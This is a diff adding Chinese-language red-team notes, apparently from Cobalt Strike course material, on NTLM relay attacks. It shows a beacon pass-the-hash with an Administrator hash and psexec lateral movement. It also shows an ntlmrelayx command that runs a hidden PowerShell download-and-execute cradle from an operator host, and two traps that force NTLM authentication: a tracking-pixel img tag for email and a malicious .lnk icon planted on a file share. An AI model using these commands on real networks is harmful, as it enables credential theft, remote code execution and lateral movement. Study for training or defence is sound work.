@@ -320,3 +320,54 @@ Disconnect from 10.10.17.132:50332 to 10.10.17.231:445
 
 
 ![alt NTLM Relaying](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/dump-sam.png)
+
+
+拿到的ntml可以本地破解，也可以pth
+```
+beacon> pth .\Administrator b423cdd3ad21718de4490d9344afef72
+
+beacon> jump psexec64 srv-2 smb
+[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_a3) on srv-2 via Service Control Manager (\\srv-2\ADMIN$\3695e43.exe)
+Started service 3695e43 on srv-2
+[+] established link to child beacon: 10.10.17.68
+```
+
+
+ntlmrelayx除了dump 哈希以外，还可以执行命令
+```
+root@kali:~# proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c
+'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
+```
+
+
+停止PortBender命令
+```
+beacon> jobs
+[*] Jobs
+
+ JID  PID   Description
+ ---  ---   -----------
+ 0    1240  PortBender
+
+beacon> jobkill 0
+beacon> kill 1240
+```
+
+## 触发NTML身份验证的其他方法
+
+1. 发送邮件时的图片链接
+```
+<img src="\\10.10.17.231\test.ico" height="1" width="1" />
+```
+
+2. windows快捷方式
+
+一个Windows快捷方式可以有多个属性，包括目标、工作目录和一个图标。 创建一个图标属性指向UNC路径的快捷方式，当它在资源管理器中被查看时，将触发NTLM认证尝试（甚至不需要点击）。
+
+创建快捷方式的最简单方法是使用PowerShell
+```
+$wsh = new-object -ComObject wscript.shell
+$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
+$shortcut.IconLocation = "\\10.10.17.231\test.ico"
+$shortcut.Save()
+```
